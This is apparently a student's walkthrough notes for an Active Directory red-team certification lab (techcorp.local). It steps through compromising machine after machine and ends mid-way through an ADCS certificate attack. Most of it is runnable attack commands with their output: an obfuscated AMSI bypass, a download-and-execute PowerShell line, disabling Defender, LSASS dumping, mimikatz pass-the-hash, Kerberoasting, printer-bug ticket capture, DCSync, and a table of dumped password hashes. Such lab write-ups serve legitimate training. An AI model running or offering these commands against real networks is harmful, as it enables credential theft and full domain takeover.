![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/48e7bfdd-b69e-4bbd-981e-bdc3d61e0499)<h1 style='color:lightblue'> 00 - Total Machines </h1>

1. [ ] US-MGMT
2. [ ] US-HELPDESK
3. [ ] US-ADCONNECT
4. [ ] US-MAILMGMT
5. [ ] US-EXCHANGE
6. [ ] US-MSSQL
7. [ ] US-DC
8. [ ] US-JUMP
9. [ ] US-WEB
10. [ ]  TECHCORP.LOCAL
11. [ ] BAISTON-DC
12. [ ] PRODUCTION-DC
13. [ ] DB-SQLPROD
14. [ ] DB-SQLSRV
15. [ ] DB-DC
16. [ ] DBVENDOR-DC
17. [ ] USVENDOR-DC
18. [ ] EU-FILES
19. [ ] EU-DC
20. [ ] EUVENDOR-NET
21. [ ] EUVENDOR-DC

<h1 style='color:lightblue'> 01 - STUDENT.US.TECHCORP.LOCAL </h1>

## **Enumeration**
<hr>

STUDENT131 is a domain computer on which we have authenticated credentials. We can bypass AMSI and then load *Powerview.ps1* to start the bare enumeration on the system. 

#### To display general information:
```powershell
PS> hostname
PS> whoami
PS> ipconfig
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/171b9389-67a2-4cea-9336-cc07016bb121)


#### Bypassing AMSI on STUDVM machine and load PowerView and start enumeration on our machine:
```powershell
PS> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

PS> . .\PowerView.ps1
```

#### 1. To Enumerate name of group in RestricedGroups in *Mgmt* Group Policy
```powershell
PS> Get-NetGPOGroup
# machineadmins 
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e120c84a-0e66-46a1-8073-a0db18029331)





#### 2. DisplayName of Group Policy applied on Students OU
```powershell
PS> Get-NetOU
PS> (Get-NetOU Students).gplink
PS> Get-NetGPO -ADSPath 'LDAP://cn={FCE16496-C744-4E46-AC89-2D01D76EAD68},cn=policies,cn=system,DC=us,DC=techcorp,DC=local'
# StudentPolicies 
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/3e95ab83-a58d-4c35-9782-734b356b67a0)



#### 3. Name of the forest with which us.techcorp.local has an External trust
```powershell
PS> Get-NetDomainTrust -Domain US.TECHCORP.LOCAL
# eu.local 
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/86abbfdb-6a60-4b84-8ae7-609f529133e6)



#### 4. Name of the forest other than us.techcorp.local with which eu.local has a trust
```powershell
PS> Get-NetForestTrust -Forest EU.LOCAL
# euvendor.local
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/6a3b1038-2372-4cc3-87be-3cb172521c84)




## **Local Privilege Escalation**
<hr>

+ There is a misconfigured service named *'AMG'*, we can abuse it by adding our selves as an local admin.
#### 5. Name of the service abused on student vm for local privilege escalation
1. Use `PowerUps.ps1` to check for misconfigurations
```powershell
PS> . .\PoverUps.ps1
PS> Invoke-AllChecks
# ALG
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/183e5f76-00a8-4ed7-a533-a382768f31c7)



2. We can abuse service permissions by adding our selves as the local admin
```powershell
PS> Invoke-ServiceAbuse -Name 'ALG' -UserName 'us\studentuser131'
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/d42570c2-b7a9-4d25-a9ba-ce7b5afc5e7e)



#### BloodHound
+ Spawning a new PS session as administrator we can run bloodhound to get a graphical representation of the complete domain. This will help us to map all the domain users, groups, policies, trusts etc.
```powershell
PS> C:\AD\Tools\BloodHound-master\Collectors\SharpHound.exe -c All,LoggedOn
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4f00bf73-3c1c-48cf-a73d-5867bfb703d7)


<h1 style='color:lightblue'> 02 - US-MGMT.US.TECHCORP.LOCAL </h1>

## **OU Delegation**
<hr>

+ We will be doing an OU delegation from *studentuser131* to get access to *US-MGMT*
+ Opening the BloodHound Report we can see that *studentuser131* has few properties which can be abused to access *US-MGMT* machine

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/17fcf927-bc78-4a9d-8273-db94c5cf7070)


#### 6. Name of the group that has GenericAll/FullControl rights on MachineAdmins and has studentusers as members
```powershell
PS> # check the bloodhound report
# MANAGERS
```

#### Abusing the OU Delegation 
1. We can add our selves into the *MACHINEADMINS* Group
```powershell
PS> Add-DomainGroupMember -Identity 'MACHINEADMINS' -Members 'studentuser131' 
PS> Get-DomainGroupMember -Identity 'MACHINEADMINS'
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1e17dee2-3d14-4a0a-bb38-0aba88c43174)



2. Now that we are a part of that group we can use `winrs` wo connect to the machine
```powershell
PS> winrs -remote:US-MGMT -u:us\studentuser131 -p:'aSLxbA8Kr76BHrwG' cmd.exe
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9c45660b-b712-4a34-a2a5-7fe89ab7fb3d)


3. Now that we have access to *us-mgmt*, we can execute mimikatz and dump the hashes
```powershell
PS> . .\Invoke-Mimi.ps1
PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'
# we found a new user
# username :: mgmtadmin 
# ntlm :: e53153fc2dc8d4c5a5839e46220717e5
# sry forgot to take a ss :(
```

4. Now that we have a new user and its hash we can spawn a new session as that user
```powershell
PS> . .\Invoke-Mimi.ps1
PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:mgmtadmin /domain:US.TECHCORP.LOCAL /ntlm:e53153fc2dc8d4c5a5839e46220717e5 /run:powershell.exe"'
```

#### 7. Name of the group that MachineAdmins group is a member of on machines in the Mgmt OU
```powershell
PS> # administrators
```

#### 8. SevicePrincipalName of the user serviceaccount that we Kerberoasted
+ We can check it using Bloodhound

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/44e8f7b3-e60b-45de-9a14-3ae4641c60e7)



```powershell
PS> # USSvc/serviceaccount
```

#### 9. Password for supportXuser that we Kerberoasted
```powershell
# Check for interesting ACL's
PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "StudentUsers"}

# check if supportXuser already has a SPN. We can do it with PowerView or ActiveDirectory module
PS> Get-ADUser -Identity support131user -Properties ServicePrincipalName | select ServicePrincipalName

# Since studentuser131 has GenericAll rights on the support131user, let’s force set a SPN on it
PS> Set-ADUser -Identity support131user -ServicePrincipalNames @{Add='us/myspnX'} -Verbose

# Now, once again check the SPN for supportXuser
PS> Get-ADUser -Identity supportXuser -Properties ServicePrincipalName | select ServicePrincipalName

# Now, we can Kerberoast the SPN
PS> C:\AD\Tools\Rubeus.exe kerberoast /user:support131user /simple /rc4opsec /outfile:C:\AD\Tools\targetedhashes.txt

# Use john to crack the hash
$> john hash --wordlist=/path/to/rockyou.txt
# Desk@123
```

<h1 style='color:lightblue'> 03 - US-MAILMGMT.US.TECHCORP.LOCAL </h1>

## **LAPS Abuse**
<hr>

1. We will load *PowerView.ps1* and start enumerating for users whose creds we can read in clear text
```powershell
# find users who can read the passwords in clear text machines in OUs
PS> Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_}
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/36e55f5f-fd0b-40e3-99e3-186d2e887faf)


2. From the above response we can see that *us-mailmgmt*'s creds can be read in clear text. Using the AD Module we can view the laps permissions for that user and then dump the creds.
```powershell
# invisishell to bypass powershell
PS> C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

# enumerate OUs where LAPS is in use along with users who can read the passwords in clear text
# Using Active Directory module
PS> .\Get-LapsPermissions.ps1

# Once we compromise the user which has the Rights, use the following to read clear-text password
# Powerview
PS> Get-DomainObject -Identity US-MailMgmt | select -ExpandProperty ms-mcs-admpwd

# newuser
# username :: US-MailMgmt
# password :: LIaOF}u!g7yYE,
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/559a1e75-b472-465d-98dd-816e2853bc94)


3. Using the creds we can use `winrs` to logon as *US-MAILMGMT*
```powershell
PS> winrs -remote:US-MAILMGMT -u:US-MAILMGMT\administrator -p:'LIaOF}u!g7yYE,' cmd.exe
PS> whoami
PS> hostname
PS> ipconfig
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/886bc991-38ca-485c-9814-a316f93e59c7)


## **Dumping Credentials**
<hr>

+ We can bypass AMSI on the new session and then use `mimikats.ps1` to dump the ekeys. 
```powershell
# bypass amsi
PS> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )

# transfer mimi.ps1 and execute
PS> iex (New-Object Net.WebClient).DownloadString('http://192.168.100.131/Invoke-Mimi.ps1')

# dump creds
PS> Invoke-Mimi -Command '"sekurlsa::ekeys"'

# found a new user 
# username :: provisioningsvc 
# ntlm :: 44dea6608c25a85d578d0c2b6f8355c4 
# aes256 :: a573a68973bfe9cbfb8037347397d6ad1aae87673c4f5b4979b57c0b745aee2a 
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/dc60eba4-c31a-4ad9-a21c-37b0fabf5750)


#### 10. The attribute of a computer object that holds password managed by LAPS in clear-text
```powershell
PS> # ms-mcs-admpwd
```

#### 11. Which user or group can read clear-text credentials for Administrator of us-mailmgmt
```powershell
PS> # studentusers
```

#### 12. Microsoft signed binary that can be used on us-mailmgmt to download files
```powershell
PS> winrs -r:us-mailmgmt -u:.\administrator -p:t7HoBF+m]ctv.] "bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\Users\\Public\\Loader.exe"
# bitsadmin
```

## **GMSA Abuse**
<hr>

1. Looking at the BloodHound Report provisioningsvc can do GMSA Abuse on jumpone

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/72573a9f-99bf-4ef8-8e13-a77a25e2dc59)



2. With the new NTLM hash obtained we can spawn a new PS session. With powerview and admodule we can enumerate the GMSA.
```powershell
# spawn a session as that user
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:provisioningsvc /domain:US.TECHCORP.LOCAL /ntlm:44dea6608c25a85d578d0c2b6f8355c4 /run:powershell.exe"'

# A gMSA has object class 'msDS-GroupManagedServiceAccount'. This can be used to find the accounts
PS> Get-DomainObject -LDAPFilter '(objectClass=msDS-GroupManagedServiceAccount)'
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/896dc1a4-f162-42cb-b2a0-b696bdc7d26b)


3. Now that its confirmed we can extract the creds for jumone
```powershell
# import ad module
PS> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1

# The attribute 'msDS-GroupMSAMembership' (PrincipalsAllowedToRetrieveManagedPassword) lists the principals that can read the password blob
PS> Get-ADServiceAccount -Identity jumpone -Properties * | select PrincipalsAllowedToRetrieveManagedPassword

# Save the blob to a variable
PS> $gmsa = Get-ADServiceAccount -Identity 'jumpone' -Properties 'msDS-ManagedPassword'
PS> $mp = $gmsa.'msDS-ManagedPassword'

# Decode the data structure using the DSInternals module
PS> Import-Module .\DSInternals_v4.7\DSInternals\DSInternals.psd1
ConvertFrom-ADManagedPasswordBlob $mp

# Build a NT-Hash for PTH
PS> (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
# ntlm :: 652dee94a4b31b80017b4b308c551726 

# Alterantive: build a Credential-Object with the Plain Password
PS> $cred = new-object system.management.automation.PSCredential "us\jumpone",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/9c9cc040-aef7-4462-8c64-de10c189a79c)


#### 13. Name of the Group Managed Service Account (gMSA)
```powershell
PS> # jumpone
```

#### 14. Name of the user that can read password blob for gMSA
```powershell
PS> # provisioningsvc
```

<h1 style='color:lightblue'> 04 - US-JUMP.US.TECHCORP.LOCAL </h1>

## **Local Admin Access**
<hr>

1. From the hash extracted from *US-MAILMGMT* we found `jumpone` user. Using PS session as that user and search for local admin's present on that system.
```powershell
# session as jumpone
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:jumpone /domain:US.TECHCORP.LOCAL /ntlm:652dee94a4b31b80017b4b308c551726 /run:powershell.exe"'

# find local admin access
PS> . .\Find-PSRemotingLocalAdminAccess.ps1
PS> Find-PSRemotingLocalAdminAccess -Verbose

# connect to us-jump
PS> winrs -r:us-jump cmd
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/54e4d20e-9b31-44df-8453-df455af3df0c)


## **Bypassing WDECK**
<hr>

+ The first thing which came in mind was to use mimikatz to dump the creds. When we try to execute the file we can see we are in constrained language mode which does not allow us to execute the powershell script.
+ We can go a way around it instead of finding a way to bypass constrained language mode. Since our final goal is to dump the lsass process we can just disable windows defender and dump the process from memory 
```powershell
# disable defender
PS> Set-MpPreference -DisableRealtimeMonitoring $true

# Run the following command
PS> tasklist /FI "IMAGENAME eq lsass.exe"

# Execute the following command
PS> rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 720 C:\Users\Public\Documents\lsass.dmp full
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/efe4ceac-54a0-4657-89f7-e8d2665b0a23)


+ Now we can transfer this file to our studentvm and use mimikatz to dump the creds offline
```powershell
# Copy the LSASS dump to another location
PS> echo F | xcopy \\us-jump\C$\Users\Public\Documents\lsass.dmp C:\AD\Tools\dump\lsass.dmp

# Now Extract the credentials from the LSASS dump.
PS>  C:\AD\Tools\mimikatz_trunk\x64\mimikatz.exe
mimikatz > sekurlsa::minidump C:\AD\Tools\dump\lsass.dmp
mimikatz > privilege::debug
mimikatz > sekurlsa::ekeys

# found three new users

# user-1 :: appsvc
# password :: Us$rT0AccessDBwithImpersonation
# ntlm :: 1d49d390ac01d568f0ee9be82bb74d4c 
# aes256 :: b4cb0430da8176ec6eae2002dfa86a8c6742e5a88448f1c2d6afc3781e114335 

# user-2 :: pawadmin 
# ntlm :: 36ea28bfa97a992b5e85bd22485e8d52 
# aes256 :: a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30

# user-3 :: webmaster
# ntlm :: 23d6458d06b25e463b9666364fb0b29f 
# aes256 :: 2a653f166761226eb2e939218f5a34d3d2af005a91f160540da6e4a5e29de8a0
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/fccbb81e-0ad0-4bf1-895e-d4cac8accc21)


![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/cb74e3a3-5c16-4e04-a331-d099cfca616d)


![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/1fcc0dfe-ca67-4364-bdc5-77affd9c3f2d)


## **Dumping the Certificate Pfx**
<hr>

+ On further searching we can see a certificate share we can access. We can extract and copy this certificate to our local machine for later usage.
+ The certificate is owned by *pawadmin*.
```powershell
# extracting cert
# In the PowerShell session that starts, run the following command to list all the certificates for LocalMachine in the certificate store. Note that our ability to use tools like Mimikatz to export certificates is limited by present of WDAC on us-jump
PS> ls cert:\LocalMachine\MY

# We have a certificate for the user pawadmin in the store! Let's try to export it
PS>  ls cert:\LocalMachine\My\C4C720A7734627F08F992B40E2C63978684E551D | Export-PfxCertificate -FilePath C:\Users\Public\Documents\pawadmin.pfx -Password (ConvertTo-SecureString -String 'SecretPass@123' -Force -AsPlainText)

# Copy the certificate to the student VM
PS> echo F | xcopy \\us-jump\C$\Users\Public\Documents\pawadmin.pfx C:\AD\Tools\dump\pawadmin.pfx

# We will use this certificate later!
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/e1670a48-5d96-4175-b337-3c7a0eb2e269)



#### 15. PowerShell command that we used to check Applocker rules on us-jump
```powershell
PS> Get-ApplockerPolicy -Effective
# Get-ApplockerPolicy -Effective
```

#### 16. PowerShell command that we used to check WDAC/Device Guard on us-jump
```powershell
PS> Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
# Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

#### 17. Microsoft signed executable that we used to dump memory of lsass from command line on us-jump
```powershell
PS> # rundll32.exe
```

<h1 style='color:lightblue'> 05 - US-WEB.US.TECHCORP.LOCAL </h1>

## **Local Admin Access**
<hr>
1. From the hash extracted from *US-JUMP* we found `webmaster` user. Using PS session as that user and search for local admin's present on that system.

```powershell
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:webmaster /domain:US.TECHCORP.LOCAL /ntlm:23d6458d06b25e463b9666364fb0b29f /run:powershell.exe"'

# find local admin access
PS> . .\Find-PSRemotingLocalAdminAccess.ps1
PS> Find-PSRemotingLocalAdminAccess -Verbose

# connect to us-jump
PS> winrs -r:us-web cmd
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/77f6f74a-47f9-4e87-ab04-d769e792f18c)


<h1 style='color:lightblue'> 06 - US-DC.US.TECHCORP.LOCAL </h1>

## **UnConstrained Delegation - Print Bug**
<hr>

1. Doing enumeration we can see that *US-WEB* has unconstrained delegation on *US-DC*
```powershell
PS> Get-NetComputer -UnConstrained
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/f114d83b-bb08-4bcb-8010-4110025da947)



2. We can use print bug exploit to capture the ticket of the DC. For this we can spawn two sessions as *US-WEB* where `rubeus.exe` will be set as monitor mode and on the other session we can use `MS-RPRN.exe` to force the *DC* to connect to *WEB* and capture the ticket.
```powershell
# disable defender
PS> Set-MpPreference -DisableRealtimeMonitoring $true

# copy rubeus on the machine (terminal 1)
PS> echo F | xcopy C:\AD\Tools\Rubeus.exe \\us-web\C$\Windows\Tasks\Rubeus.exe /Y

# set on monitor mode
PS> .\Rubeus.exe monitor /targetuser:US-DC$ /interval:5 /nowrap

# copy MS-RPRN on the machine (terminal 2)
PS> echo F | xcopy C:\AD\Tools\MS-RPRN.exe \\us-web\C$\Windows\Tasks\MS-RPRN.exe /Y

# force the dc to connect to web
PS> .\MS-RPRN.exe \\us-dc.us.techcorp.local \\us-web.us.techcorp.local
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/4e137460-3f03-42a3-a6fe-e691d04978d4)


2. Using *Rubeus* we can inject the ticket into the session
```powershell
PS> C:\AD\Tools\Rubeus.exe ptt /ticket:doIFvDCCBbigAwIBBaEDAgEWooIEtDCCBLBhggSsMIIEqKADAgEFoRMbEVVTLlRFQ0hDT1JQLkxPQ0FMoiYwJKADAgECoR0wGxsGa3JidGd0GxFVUy5URUNIQ09SUC5MT0NBTKOCBGIwggReoAMCARKhAwIBAqKCBFAEggRMsztl0SQHlPKKeIMUzVBV0BzWFP3qndXcFGoicxBwbI2cbCxooSagHYo0YiCK/lo+vCfhkWkz9mUvrnttymrYp8zKAoSxBFOyPPQU17WFb052KXfnhR+h+iBBeJC+7iG0qNXTge5BYxIgooIUnkAeYfQj+Xx4/JvzbGLDxO/EeZenzT+INfwwFT8xybgxT2JCYgjQor7jQdmJs345vTk3sNL2QZXUodnyUCBYUkRKn7KTwB7r5y9uSJbp+RlPV8Nr63gQiMLiXbAEF8jhyWtHqJOcM+QFDmDf51UYWht1SbAHQMysYEXMqD45wPMD+U0Kr5Bs46kOsbD9Zh6XJSLoRCVDoHCWAhmD5BqXTghpKIKRxdj/tUjbsSZ4wENFA2cLbgSWILYh9pDrpZFg8m3ukBbkRBuVQygtYagKhMzWGw5I1EVyPcIrs/aF1XohUvA9C/YDIqmWAT7v7UG9AAHtOOyUvVXx8IzxQMEtR4aCyrigDo7md4uOqj5lKFqO9DU5f+pPuS37pPRzecpUYLZ3oopikd8Ds9kGcigxalPRLLxZ3lpDZgheTm0Sw5zKDdM4pxj2MyMQRSiBj/4m3eUnueDcYBLl0ntQ4k8NkZcAgUwULf2FtWcMrH95Kpyt0z85CZuGlqYrJJwxzvrCVrv771CX6X3gtMn23n9P+sWLwQ83XRowfw6FoOGMtf077IymwlfpfTFjEf2vDNpfr2ayLQtFuJz1RpNJv7EHFf0qzPlX/2tTVu0Roxu7PPU3ogAlPy4nKONETO/Xe7HYoJsjW1/cBWQBLsiy9UU7nI2kYCT9ONsLLG5hdBZNF9tJwhX0qLw248W0doTxSf/dAjOtwM4+yjMtV2pWbwQBnlFEtjLcS9QLetitolEQT2WQ/tWVH978SQpQdbfiPlF9mZ8mfWjGZGUOdlxPOPALcnJUKLM3HQsBMJLWmtYk+EwdJs63shedWojFKaWzRuotysE51bjzRPmJOk67YwKk3LKXpLxqx0BCUg+Juwnc23BkWR7na6speYIqiEfHfDp9/lkcN/O1ojvwqOiQkXtKUyZVgXhVYRurz2dZCwt8srv98jcRGnCC7S36lnSLU3l00DbTIKgbmyp82Hz1g3PMqmwdfXcyu6BGQ1WzTD4zTgi8+0nZSXOCcqJ2wwER7QBPG0aizcaHakhbHNRti8gFZ4z0/8ScqsCRaOxNFh3CiJQU0hERHKbx/bh3R9DnIF6P1KCQkDSydHJus4t/cGD9i9hQziNluqJ6XC8UvoJq+yjfsSQClicpy9updrIAuk0TioYxPLxvnoLijOoAw0FCoRM5rde5OILX/OrrQxHYUm2fOsmoRG0yBspdFMQ+RVT2LZ6F5Ze5z6P+70i9B3alY3I1N8iETqqfMls6VD5ANXaqeXPkUb7z5gfNSxYx52/sha6XIsqXZMVma59GB9s6b1QRFdzuExXjCLOGNS/eEWejgfMwgfCgAwIBAKKB6ASB5X2B4jCB36CB3DCB2TCB1qArMCmgAwIBEqEiBCDs55e1N7jwf1BLaApMqFY1W3sRrr3VNZsNGHiMWEvk96ETGxFVUy5URUNIQ09SUC5MT0NBTKITMBGgAwIBAaEKMAgbBlVTLURDJKMHAwUAYKEAAKURGA8yMDIzMDcwMTA3MzMzOVqmERgPMjAyMzA3MDExNzMzMzlapxEYDzIwMjMwNzA3MjIwMzE4WqgTGxFVUy5URUNIQ09SUC5MT0NBTKkmMCSgAwIBAqEdMBsbBmtyYnRndBsRVVMuVEVDSENPUlAuTE9DQUw=
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/21de5593-911e-4b34-a21d-3cd8ac127ea1)



3. Now we can perform a DC-Sync attack and dump the *krgtgt* and *administrator* hash
```powershell
# dumping krbtgt
PS> C:\AD\Tools\SharpKatz.exe --Command dcsync --User us\krbtgt --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local

# dumping administrator
PS> C:\AD\Tools\SharpKatz.exe --Command dcsync --User us\administrator --Domain us.techcorp.local --DomainController us-dc.us.techcorp.local

# administrator
# ntml :: 43b70d2d979805f419e02882997f8f3f

# krgtgt
# ntlm :: b0975ae49f441adc6b024ad238935af5  

# US.TECHCORP.LOCAL
# aes128 :: 1bae2a6639bb33bf720e2d50807bf2c1 
# aes256 :: 5e3d2096abb01469a3b0350962b0c65cedbbc611c5eac6f3ef6fc1ffa58cacd5
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/d9b591b8-d396-41ce-ab46-513044e6c90c)


![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/2ab62ab8-dd4f-4800-8634-5dd646f24f48)


4. With the administrator hash we can use pth and get a session to *US-DC*
```powershell
PS> Invoke-Mimi -Command '"sekurlsa::pth /user:administrator /domain:US.TECHCORP.LOCAL /ntlm:43b70d2d979805f419e02882997f8f3f /run:powershell.exe"'

# searching for local admin access
PS> . .\Find-PSRemotingLocalAdminAccess.ps1
PS> Find-PSRemotingLocalAdminAccess -Verbose

# connect to the dc
PS> winrs -r:us-dc cmd
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/64c574f8-be66-4bd7-a095-0b1639e7c020)


5. Now we can dump all the user creds of the DC
```powershell
# enter the session
PS> winrs -r:us-dc cmd

# disable defender
PS> Set-MpPreference -DisableRealtimeMonitoring $true

# exit
PS> exit

# transfer mimi exe
PS> echo F | xcopy C:\AD\Tools\mimikatz.exe \\us-dc\C$\Windows\Tasks\mimikatz.exe /Y

# enter the session again
PS> winrs -r:us-dc cmd

# execute mimi
PS> C:\Windows\Tasks\mimikatz.exe
mimikatz > lsadump::lsa /patch
```

| RID  | User            | NTLM                             |
| ---- | --------------- | -------------------------------- |
| 500  | Administrator   | 43b70d2d979805f419e02882997f8f3f |
| 502  | krbtgt          | b0975ae49f441adc6b024ad238935af5 |
| 1114 | adconnect       | 4e150424ccf419d83ce3a8ad1db7b94a |
| 1115 | mgmtadmin       | e53153fc2dc8d4c5a5839e46220717e5 |
| 1120 | helpdeskadmin   | 94b4a7961bb45377f6e7951b0d8630be |
| 1121 | dbservice       | e060fc2798a6cc9d9ac0a3bb9bf5529b |
| 1122 | atauser         | f7f6ab297d5a4458073b91172f498b70 |
| 1124 | exchangeadmin   | 65c1a880fcf8832d55fdc1d8af76f117 |
| 1136 | exchangemanager | b8a0ea6e3c104472377d082154faa9e4 |
| 1137 | exchangeuser    | 1ef08776e2de6e9d9062ff9c81ff3602 |
| 1138 | pawadmin        | 36ea28bfa97a992b5e85bd22485e8d52 |
| 1139 | jwilliams       | 65c6bbc54888cbe28f05b30402b7c40b |
| 1140 | webmaster       | 23d6458d06b25e463b9666364fb0b29f |
| 1144 | serviceaccount  | 58a478135a93ac3bf058a5ea0e8fdb71 |
| 1271 | devuser         | 539259e25a0361ec4a227dd9894719f6 |
| 1289 | decda           | 068a0a7194f8884732e4f5a7cb47e17c |
| 4601 | appsvc          | 1d49d390ac01d568f0ee9be82bb74d4c |
| 8602 | provisioningsvc | 44dea6608c25a85d578d0c2b6f8355c4 |
| 1000 | US-DC$          | f4492105cb24a843356945e45402073e |
| 1104 | US-EXCHANGE$    | 20a0e5d7c56dc75c9d2b4f3ac6c22543 |
| 1105 | US-MGMT$        | fae951131d684b3318f524c535d36fb2 |
| 1106 | US-HELPDESK$    | 76c3848cc2e34ef0a8b5751f7e886b8e |
| 1107 | US-MSSQL$       | ccda609713cb52b1aa752ee23aaf2fae |
| 1108 | US-MAILMGMT$    | 6e1c353761fff751539e175a8393a941 |
| 1109 | US-JUMP$        | abff11a76a2fa6de107f0ea8251005c5 |
| 1110 | US-WEB$         | 892ca1e8d4343c652646b59b51779929 |
| 1111 | US-ADCONNECT$   | 093f64d9208f2b546a3b487388b2b34a |
| 8601 | jumpone$        | 652dee94a4b31b80017b4b308c551726 |
| 1103 | TECHCORP$       | bbcdac9efba97fa41c09ccf99d00d699 |
| 1143 | EU$             | dcf91b29eeab0fba83a88d12508f3107 |

#### 19. Name of the user whose credentials we extracted from us-jump and it has administrative access on us-web
```powershell
PS> # webmaster
```

#### 20. The logon event that Rubeus uses to monitor for TGTs
```powershell
PS> # 4624
```

#### 21. Name of the high privilege user that is compromised by abusing printer bug
```powershell
PS> # us-dc
```

## **ADCS Attack**
<hr>

1. Search for vulnerable certificate templates
```powershell
PS> Certify.exe find
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/a12b989a-0522-43a4-883f-0b14ff23ee99)



2. From here we can see pawadmin has enrollment right this template. We can try to abuse this by request a TGT for pawadmin and inject in current session.
```powershell
# user-2 :: pawadmin 
# ntlm :: 36ea28bfa97a992b5e85bd22485e8d52 
# aes256 :: a92324f21af51ea2891a24e9d5c3ae9dd2ae09b88ef6a88cb292575d16063c30

PS> # ps session as pawadmin
Invoke-Mimi -Command '"sekurlsa::pth /user:pawadmin /domain:US.TECHCORP.LOCAL /ntlm:36ea28bfa97a992b5e85bd22485e8d52 /run:powershell.exe"'

# we extracted certificate of pawadmin from the us-jump. Use the certificate to request a TGT for pawadmin and inject in current session
PS> C:\AD\Tools\Rubeus.exe asktgt /user:pawadmin /certificate:C:\AD\Tools\dump\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
```

![image](https://github.com/0xStarlight/CRTE-Notes/assets/59029171/5efd9d2e-1fb8-4352-aead-c5773a80778e)


3. We can enroll in the template 
```powershell
PS> C:\AD\Tools\Certify.exe request /ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA /template:ForAdminsofPrivilegedAccessWorkstations /altname:Administrator

# cat cert.pem
-----BEGIN RSA PRIVATE KEY-----
